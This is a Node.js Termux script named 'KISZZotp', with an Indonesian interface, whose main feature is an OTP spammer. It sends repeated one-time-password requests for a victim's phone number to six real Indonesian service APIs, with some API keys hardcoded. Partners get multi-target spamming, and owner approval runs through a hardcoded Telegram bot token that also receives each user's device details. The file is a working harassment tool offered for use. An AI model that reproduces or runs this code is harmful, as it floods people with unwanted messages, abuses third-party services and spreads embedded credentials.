import axios from 'axios';
import chalk from 'chalk';
import readlineSync from 'readline-sync';
import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';

const C = {
    TOKEN: '8732611588:AAEx3e8yuZa9r-mMeRxQZ_i2kt361ZXZl_w',
    CHAT_ID: '8276813899',
    OWNER: '085168142675',
    VER: '2.4.0',
    TIMEOUT: 120,
    POLL: 1,
};

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function logActivity(user, action, detail = '') {
    try {
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const log = `[${timestamp}] ${user} -> ${action} ${detail}\n`;
        fs.appendFileSync('activity.log', log);
    } catch {}
}

function getInfo() {
    try {
        if (!fs.existsSync('info.json')) return null;
        const data = JSON.parse(fs.readFileSync('info.json'));
        return data.text || null;
    } catch { return null; }
}
function setInfo(text) {
    try {
        fs.writeFileSync('info.json', JSON.stringify({ text: text.trim(), updated: new Date().toISOString() }, null, 2));
        return true;
    } catch { return false; }
}
function delInfo() {
    try { if (fs.existsSync('info.json')) fs.unlinkSync('info.json'); return true; } catch { return false; }
}

function getChannel() {
    try {
        if (!fs.existsSync('channel.json')) return null;
        const data = JSON.parse(fs.readFileSync('channel.json'));
        return data.link || null;
    } catch { return null; }
}
function setChannel(link) {
    try {
        fs.writeFileSync('channel.json', JSON.stringify({ link: link.trim(), updated: new Date().toISOString() }, null, 2));
        return true;
    } catch { return false; }
}
function delChannel() {
    try { if (fs.existsSync('channel.json')) fs.unlinkSync('channel.json'); return true; } catch { return false; }
}

function getID() {
    try { return `${execSync('id -u').toString().trim()}@${os.hostname()}`; } catch { return 'unknown'; }
}
function getDevice() {
    try {
        const m = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
        const a = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
        return `${m} (Android ${a})`;
    } catch { return 'Unknown'; }
}
function getTime() { return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); }
function genCode() { return crypto.randomInt(100000, 999999).toString(); }

async function sendTG(text, kb = null) {
    try {
        const p = { chat_id: C.CHAT_ID, text, parse_mode: 'Markdown' };
        if (kb) p.reply_markup = JSON.stringify({ inline_keyboard: kb });
        await axios.post(`https://api.telegram.org/bot${C.TOKEN}/sendMessage`, p);
        return true;
    } catch { return false; }
}
async function ansCB(id, text) {
    try { await axios.post(`https://api.telegram.org/bot${C.TOKEN}/answerCallbackQuery`, { callback_query_id: id, text, show_alert: false }); } catch {}
}
async function getUpd(off) {
    try { const r = await axios.get(`https://api.telegram.org/bot${C.TOKEN}/getUpdates`, { params: { offset: off, timeout: 10 } }); return r.data.result || []; } catch { return []; }
}

function isApp(id) {
    try { if (!fs.existsSync('approved.json')) return false; return JSON.parse(fs.readFileSync('approved.json')).includes(id); } catch { return false; }
}
function saveApp(id) {
    try { let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : []; if (!d.includes(id)) { d.push(id); fs.writeFileSync('approved.json', JSON.stringify(d, null, 2)); } return true; } catch { return false; }
}
function remApp(id) {
    try { let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : []; const nd = d.filter(x => x !== id); fs.writeFileSync('approved.json', JSON.stringify(nd, null, 2)); return true; } catch { return false; }
}
function getApprovedList() {
    try { return fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : []; } catch { return []; }
}

function getLimit(id) {
    try { if (!fs.existsSync('limits.json')) return { count: 0, date: new Date().toDateString() }; const d = JSON.parse(fs.readFileSync('limits.json')); return d[id] || { count: 0, date: new Date().toDateString() }; } catch { return { count: 0, date: new Date().toDateString() }; }
}
function incLimit(id) {
    try { let d = fs.existsSync('limits.json') ? JSON.parse(fs.readFileSync('limits.json')) : {}; const today = new Date().toDateString(); if (!d[id] || d[id].date !== today) { d[id] = { count: 1, date: today }; } else { d[id].count += 1; } fs.writeFileSync('limits.json', JSON.stringify(d, null, 2)); return d[id].count; } catch { return 0; }
}

async function reqApp(user, id, dev) {
    const code = genCode();
    const kb = [[{ text: '✅ Approve', callback_data: `app_${code}` }, { text: '❌ Deny', callback_data: `den_${code}` }]];
    const msg = '🔐 *Request Approval*\n👤 ' + user + '\n🆔 ' + id + '\n📱 ' + dev + '\n🔑 *' + code + '*';
    console.log(chalk.yellow('\n⏳ Mengirim request...'));
    if (!await sendTG(msg, kb)) { console.log(chalk.red('❌ Gagal kirim ke TG.')); process.exit(1); }
    console.log(chalk.green('✅ Request terkirim! Tunggu owner...'));
    let off = 0;
    try { const old = await getUpd(0); if (old.length > 0) off = old[old.length - 1].update_id + 1; } catch {}
    const start = Date.now();
    while ((Date.now() - start) / 1000 < C.TIMEOUT) {
        try {
            const up = await getUpd(off);
            for (const u of up) {
                off = u.update_id + 1;
                if (u.callback_query) {
                    const d = u.callback_query.data;
                    const from = u.callback_query.from.id;
                    const cid = u.callback_query.id;
                    if (from == C.CHAT_ID) {
                        if (d === 'app_' + code) { await ansCB(cid, '✅ Disetujui!'); console.log(chalk.green('\n✅ APPROVED!')); saveApp(id); logActivity(user, 'APPROVED', id); return true; }
                        if (d === 'den_' + code) { await ansCB(cid, '❌ Ditolak.'); console.log(chalk.red('\n❌ DENIED!')); return false; }
                    } else { await ansCB(cid, '❌ Bukan owner!'); }
                }
            }
        } catch {}
        await sleep(C.POLL * 1000);
    }
    console.log(chalk.red('\n⏰ Waktu habis!'));
    return false;
}

async function broadcastMessage(message) {
    try {
        const users = getApprovedList();
        if (users.length === 0) {
            await sendTG('📢 Tidak ada user yang terdaftar untuk broadcast.');
            return;
        }
        await sendTG('📢 *BROADCAST DARI OWNER:*\n' + message);
        try {
            let bd = fs.existsSync('broadcast.json') ? JSON.parse(fs.readFileSync('broadcast.json')) : [];
            bd.push({ message, timestamp: new Date().toISOString() });
            fs.writeFileSync('broadcast.json', JSON.stringify(bd, null, 2));
        } catch {}
        await sendTG('✅ Broadcast berhasil dikirim ke ' + users.length + ' user.');
        logActivity('OWNER', 'BROADCAST', message);
    } catch (e) {
        await sendTG('❌ Gagal broadcast: ' + e.message);
    }
}

async function dashboard() {
    try {
        const users = getApprovedList();
        const total = users.length;
        let statusCount = {};
        try {
            const sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
            for (const id of users) {
                const s = sd[id] || 'Gratisan';
                statusCount[s] = (statusCount[s] || 0) + 1;
            }
        } catch {}
        const statusList = Object.keys(statusCount).map(k => '- ' + k + ': ' + statusCount[k]).join('\n');
        const msg = '📊 *DASHBOARD*\n\n👥 Total User: ' + total + '\n\n📌 Status:\n' + (statusList || 'Belum ada status custom');
        await sendTG(msg);
    } catch (e) {
        await sendTG('❌ Gagal dashboard: ' + e.message);
    }
}

function getUser() {
    let n = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
    return n.trim() || 'Anonymous';
}

function getStat(isO, id) {
    if (isO) return chalk.green('★ OWNER');
    if (isApp(id)) return chalk.green('★ PARTNER');
    return chalk.yellow('▸ Gratisan');
}

function showInfoBox() {
    const info = getInfo();
    if (!info) return;
    console.log(chalk.yellow('\n╔═══════════════════════════════════╗'));
    console.log(chalk.yellow('║   📢 INFO DARI KISZZ             ║'));
    console.log(chalk.yellow('╠═══════════════════════════════════╣'));
    console.log(chalk.white('║ ' + info.padEnd(29) + ' ║'));
    console.log(chalk.yellow('╚═══════════════════════════════════╝'));
}

function showHead(u, s, id, dev) {
    console.clear();
    console.log(chalk.cyan('\n╔═══════════════════════════════════╗\n║   KISZZotp v' + C.VER + '               ║\n╠═══════════════════════════════════╣\n║ 👤 User  : ' + chalk.green(u) + '\n║ 📊 Status: ' + s + '\n║ 🆔 ID    : ' + chalk.blue(id) + '\n║ 📱 Device: ' + chalk.magenta(dev) + '\n║ ⏰ Waktu : ' + chalk.gray(getTime()) + '\n╚═══════════════════════════════════╝\n'));
    showInfoBox();
}

function showMenu(isO) {
    console.log(chalk.yellow('\n📋 MENU UTAMA'));
    console.log(chalk.yellow('─'.repeat(30)));
    console.log(chalk.cyan('1.') + ' 🚀 Spammer OTP');
    console.log(chalk.cyan('2.') + ' 🐛 Lapor Bug');
    console.log(chalk.cyan('3.') + ' 🔄 Cek Update');
    console.log(chalk.cyan('4.') + ' ❌ Keluar');
    if (isO) console.log(chalk.cyan('5.') + ' 👥 Add Partner (Owner Only)');
    console.log(chalk.cyan('6.') + ' 📢 Join Saluran KISZZ');
    console.log(chalk.yellow('─'.repeat(30)));
}

async function spam(user, id, isO, isP) {
    console.clear();
    console.log(chalk.cyan('\n🚀 SPAMMER OTP\n'));
    if (!isO && !isP) {
        const lim = getLimit(id);
        const today = new Date().toDateString();
        if (lim.date === today && lim.count >= 3) {
            console.log(chalk.red('❌ Limit habis! (3x/hari). Upgrade ke partner.'));
            readlineSync.question(chalk.gray('\nTekan Enter...'));
            return;
        }
    }
    const inp = readlineSync.question(chalk.white('📱 Nomor (pisah koma untuk partner/owner): '));
    if (!inp.trim()) return console.log(chalk.red('❌ Tidak boleh kosong!'));
    let targets = (isP || isO) ? inp.split(',').map(t => t.trim()) : [inp.trim()];
    const delay = (isP || isO) ? 500 : 2000;
    for (const t of targets) {
        let phone = t.replace(/[^0-9]/g, "");
        if (phone.startsWith("0")) phone = "62" + phone.slice(1);
        if (!phone.startsWith("62")) phone = "62" + phone;
        const p08 = "0" + phone.slice(2);
        const p62 = phone;
        console.log(chalk.green('✅ Target: ' + phone));
        const otp = [
            { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: p08 }, headers: { "x-api-key": "280999!FTTH" } },
            { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: p08, uuid: "f6bd0911---b189-" }, request_via: "whatsapp" } },
            { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: p62.replace("62", "") } },
            { url: "https://www.rumah123.com/api/otp/request-otp", data: { ipAddress: "36.67.110.51", phoneNumber: p62, portalId: 1, type: "WHATSAPP", url: "https://www.rumah123.com/user/login" }, headers: { "Base-Url-Core": "https://www.rumah123.com" } },
            { url: "https://beta.api.saturdays.com/api/v1/user/otp/send", data: { number: p62.replace("62", ""), country_code: "+62", type: "" }, headers: { "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj", "country-code": "ID" } },
            { url: "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata", data: { mobileNumber: p62.replace("62", ""), type: "prospect-create", channel: "whatsapp" } }
        ];
        let s = 0, f = 0;
        for (let i = 0; i < otp.length; i++) {
            const ep = otp[i];
            try {
                const cfg = { headers: { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0", ...(ep.headers || {}) }, timeout: 10000 };
                process.stdout.write('[' + (i+1) + '/' + otp.length + '] 🔄 Mengirim... ');
                if (ep.method === "GET") await axios.get(ep.url, cfg);
                else await axios.post(ep.url, ep.data, cfg);
                s++; console.log(chalk.green('✅ Berhasil'));
            } catch { f++; console.log(chalk.red('❌ Gagal')); }
            await sleep(delay);
        }
        console.log('\n📱 ' + phone + '\n📤 ' + otp.length + '\n✅ ' + s + '\n❌ ' + f);
        logActivity(user, 'SPAM', 'Target: ' + phone + ' | Berhasil: ' + s + ' | Gagal: ' + f);
    }
    if (!isO && !isP) {
        const nc = incLimit(id);
        console.log(chalk.gray('📊 Sisa limit: ' + (3 - nc) + ' dari 3.'));
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

function laporBug(user) {
    console.clear();
    console.log(chalk.yellow('\n🐛 LAPOR BUG\n'));
    console.log(chalk.white('📱 Owner: ' + C.OWNER));
    const c = readlineSync.question(chalk.cyan('Buka WhatsApp? (y/n): '));
    if (c.toLowerCase() === 'y') {
        execSync('termux-open-url "https://wa.me/' + C.OWNER + '?text=Halo%20KISZZ%2C%20saya%20' + encodeURIComponent(user) + '%20ingin%20lapor%20bug."');
        logActivity(user, 'LAPOR_BUG', '');
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

function cekUpdate(user) {
    console.clear();
    console.log(chalk.cyan('\n🔄 CEK UPDATE\n'));
    console.log(chalk.green('✅ Versi: ' + C.VER));
    logActivity(user, 'CEK_UPDATE', '');
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function addPartner(user) {
    console.clear();
    console.log(chalk.green('\n👥 ADD PARTNER\n'));
    const tid = readlineSync.question(chalk.cyan('📌 ID user (contoh: 10192@localhost): '));
    if (!tid.trim()) return console.log(chalk.red('❌ Tidak boleh kosong!'));
    if (isApp(tid.trim())) { console.log(chalk.yellow('⚠️ ' + tid + ' sudah ada.')); } else { saveApp(tid.trim()); console.log(chalk.green('✅ ' + tid + ' ditambahkan!')); logActivity(user, 'ADD_PARTNER', tid); }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function main() {
    console.clear();
    console.log(chalk.cyan('\n╔═══════════════════════════════════════════════╗\n║     SELAMAT DATANG DI KISZZotp               ║\n╚═══════════════════════════════════════════════╝\n'));
    await sleep(1000);
    const userName = getUser();
    const termuxId = getID();
    const device = getDevice();
    const isOwner = userName.toLowerCase() === 'kiszzaja';
    const isPartner = isApp(termuxId);

    try {
        if (fs.existsSync('broadcast.json')) {
            const bd = JSON.parse(fs.readFileSync('broadcast.json'));
            if (bd.length > 0) {
                const last = bd[bd.length - 1];
                console.log(chalk.yellow('\n📢 *PENGUMUMAN DARI OWNER:*\n' + last.message));
                console.log(chalk.gray('   (' + new Date(last.timestamp).toLocaleString('id-ID') + ')'));
                await sleep(2000);
            }
        }
    } catch {}

    if (!isOwner) {
        if (!isApp(termuxId)) {
            console.log(chalk.yellow('\n🔐 Memerlukan approval owner.'));
            if (!await reqApp(userName, termuxId, device)) {
                console.log(chalk.red('❌ Akses ditolak.'));
                process.exit(1);
            }
        } else {
            console.log(chalk.green('\n✅ Sudah terdaftar!'));
            logActivity(userName, 'LOGIN', '');
            await sleep(1000);
        }
    } else {
        console.log(chalk.green('\n👑 Owner mode!'));
        await sleep(1000);
    }

let offset = 0;
setInterval(async () => {
    if (isOwner) {
        try {
            const updates = await getUpd(offset);
            for (const u of updates) {
                offset = u.update_id + 1;
                if (u.message && u.message.text) {
                    const text = u.message.text;
                    const fromId = u.message.from.id;
                    if (fromId == C.CHAT_ID) {
                        if (text.startsWith('/setinfo')) {
                            const msg = text.slice('/setinfo'.length).trim();
                            if (!msg) { await sendTG('❌ Format: /setinfo <pesan>'); continue; }
                            if (setInfo(msg)) { await sendTG('✅ Info berhasil diupdate:\n' + msg); logActivity('OWNER', 'SET_INFO', msg); }
                            else { await sendTG('❌ Gagal menyimpan info.'); }
                        } else if (text.startsWith('/getinfo')) {
                            const info = getInfo();
                            if (info) { await sendTG('📌 *Info saat ini:*\n' + info); }
                            else { await sendTG('📌 Belum ada info.'); }
                        } else if (text.startsWith('/delinfo')) {
                            if (delInfo()) { await sendTG('✅ Info dihapus.'); logActivity('OWNER', 'DEL_INFO', ''); }
                            else { await sendTG('❌ Gagal hapus info.'); }
                        } else if (text.startsWith('/setchannel')) {
                            const link = text.slice('/setchannel'.length).trim();
                            if (!link) { await sendTG('❌ Format: /setchannel <link>'); continue; }
                            if (setChannel(link)) { await sendTG('✅ Saluran diatur:\n' + link); logActivity('OWNER', 'SET_CHANNEL', link); }
                            else { await sendTG('❌ Gagal simpan.'); }
                        } else if (text.startsWith('/getchannel')) {
                            const link = getChannel();
                            if (link) { await sendTG('📌 *Saluran:*\n' + link); }
                            else { await sendTG('📌 Belum ada saluran.'); }
                        } else if (text.startsWith('/delchannel')) {
                            if (delChannel()) { await sendTG('✅ Saluran dihapus.'); logActivity('OWNER', 'DEL_CHANNEL', ''); }
                            else { await sendTG('❌ Gagal hapus.'); }
                        } else if (text.startsWith('/setstatus')) {
                            const parts = text.split(' ');
                            if (parts.length < 3) { await sendTG('❌ Format: /setstatus <id> <status>'); continue; }
                            const targetId = parts[1].trim();
                            const status = parts.slice(2).join(' ');
                            try {
                                let sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                sd[targetId] = status;
                                fs.writeFileSync('status.json', JSON.stringify(sd, null, 2));
                                await sendTG('✅ Status *' + targetId + '* -> *' + status + '*');
                                logActivity('OWNER', 'SET_STATUS', targetId + ' -> ' + status);
                            } catch (e) { await sendTG('❌ Gagal: ' + e.message); }
                        } else if (text.startsWith('/getstatus')) {
                            const parts = text.split(' ');
                            if (parts.length < 2) { await sendTG('❌ Format: /getstatus <id>'); continue; }
                            const targetId = parts[1].trim();
                            try {
                                const sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                const status = sd[targetId] || 'Gratisan';
                                await sendTG('📌 Status *' + targetId + '*: *' + status + '*');
                            } catch (e) { await sendTG('❌ Gagal: ' + e.message); }
                        } else if (text.startsWith('/delpartner')) {
                            const parts = text.split(' ');
                            if (parts.length < 2) { await sendTG('❌ Format: /delpartner <termuxId>'); continue; }
                            const targetId = parts[1].trim();
                            if (isApp(targetId)) {
                                remApp(targetId);
                                try {
                                    let sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                    if (sd[targetId]) { delete sd[targetId]; fs.writeFileSync('status.json', JSON.stringify(sd, null, 2)); }
                                } catch {}
                                await sendTG('✅ Akses *' + targetId + '* telah dihapus.');
                                logActivity('OWNER', 'DEL_PARTNER', targetId);
                            } else { await sendTG('❌ *' + targetId + '* tidak ditemukan.'); }
                        } else if (text.startsWith('/broadcast')) {
                            const msg = text.slice('/broadcast'.length).trim();
                            if (!msg) { await sendTG('❌ Format: /broadcast <pesan>'); continue; }
                            await broadcastMessage(msg);
                        } else if (text.startsWith('/dashboard')) {
                            await dashboard();
                        } else if (text.startsWith('/help')) {
                            await sendTG('📋 *Command Owner:*\n/setinfo <pesan>\n/getinfo\n/delinfo\n/setchannel <link>\n/getchannel\n/delchannel\n/setstatus <id> <status>\n/getstatus <id>\n/delpartner <id>\n/broadcast <pesan>\n/dashboard\n/help');
                        } else {
                            await sendTG('❌ Command tidak dikenali. Ketik /help');
                        }
                    }
                }
            }
        } catch (e) {}
    }
}, 2000);

    while (true) {
        const status = getStat(isOwner, termuxId);
        showHead(userName, status, termuxId, device);
        showMenu(isOwner);
        const maxMenu = isOwner ? 6 : 6;
        const choice = readlineSync.question(chalk.cyan('\nPilih menu [1-' + maxMenu + ']: '));
        switch (choice) {
            case '1': await spam(userName, termuxId, isOwner, isPartner); break;
            case '2': laporBug(userName); break;
            case '3': cekUpdate(userName); break;
            case '4': console.log(chalk.green('\n👋 Sampai jumpa!')); logActivity(userName, 'LOGOUT', ''); process.exit(0);
            case '5':
                if (isOwner) await addPartner(userName);
                else console.log(chalk.red('❌ Menu owner!'));
                break;
            case '6':
                const channelLink = getChannel();
                if (channelLink) {
                    console.log(chalk.cyan('\n📢 *Saluran KISZZ:*\n' + channelLink));
                    console.log(chalk.green('✅ Membuka saluran...'));
                    execSync('termux-open-url "' + channelLink + '"');
                } else {
                    console.log(chalk.yellow('\n📢 Belum ada saluran yang diatur oleh owner.'));
                }
                readlineSync.question(chalk.gray('\nTekan Enter...'));
                break;
            default: console.log(chalk.red('❌ Salah!')); await sleep(1000);
        }
    }
}

main().catch(err => console.error(chalk.red('❌ Error:', err.message)));
